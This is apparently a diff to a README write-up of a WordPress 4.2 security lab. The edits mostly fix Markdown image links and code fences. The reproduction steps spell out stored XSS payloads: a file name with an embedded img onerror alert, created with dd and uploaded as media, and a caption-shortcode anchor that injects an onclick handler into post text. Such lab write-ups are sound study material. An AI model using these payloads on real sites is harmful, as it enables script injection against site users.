@@ -12,10 +12,10 @@ Time spent: **5** hours spent in total
     - Tested in version: 4.2
     - Fixed in version:
   - [X] GIF Walkthrough:
-  ![]xss-file-too-big-audio.gif
+  ![](xss-file-too-large.gif)
   - [X] Steps to recreate:
   ```
-  a. ```dd if=/dev/zero of='something<img src=a onerror=(alert('pwned'))>.png' count=1024 bs=10000``` to create a large file with the script exploit.
+  a. dd if=/dev/zero of='something<img src=a onerror=(alert('pwned'))>.png' count=1024 bs=10000 to create a large file with the script exploit.
   b. Open WordPress > Media > Add new Image
   c. Add the newly created file.
   ```
@@ -25,7 +25,7 @@ Time spent: **5** hours spent in total
     - Tested in version: 4.2.13
     - Fixed in version: 4.2.0
   - [X] GIF Walkthrough:
-  ![]xss-mp3-metadata.gif
+  ![](xss-mp3-metadata.gif)
   - [X] Steps to recreate:
   ```
   The following MP3 file can be used to reproduce this issue:
@@ -44,11 +44,11 @@ Time spent: **5** hours spent in total
     - Tested in version: 4.2.0
     - Fixed in version: N/A
   - [X] GIF Walkthrough:
-  ![]xss-caption-code-exploit.gif
+  ![](xss-caption-code-exploit.gif)
   - [X] Steps to recreate:
   ```
     1) Create a new post
-    2) Add the script on the text of the body: ```<a href="[caption code"]> </a> <a title=" onclick=alert("hi!")> something</a>```
+    2) Add the script on the text of the body: <a href="[caption code"]> </a> <a title=" onclick=alert("hi!")> something</a>
     3) Publish
   ```
 
